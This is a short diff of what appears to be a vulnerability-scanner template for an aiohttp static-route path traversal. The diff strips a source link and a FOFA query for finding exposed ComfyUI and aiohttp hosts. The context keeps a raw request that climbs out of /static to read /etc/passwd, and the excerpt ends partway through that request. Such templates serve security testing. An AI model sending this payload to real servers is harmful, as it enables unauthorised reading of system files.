@@ -3,12 +3,8 @@ info:
   name: aiohttp-static-任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zfupwezi0xy1z9x0'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zfupwezi0xy1z9x0
-    fofa: title=="ComfyUI" || (app="AIOHTTP" && server!="aiohttp/3.9.3" && server!="aiohttp/3.9.2")
 http:
 - raw:
   - 'GET /static/./../../../../../../../../etc/passwd HTTP/1.1
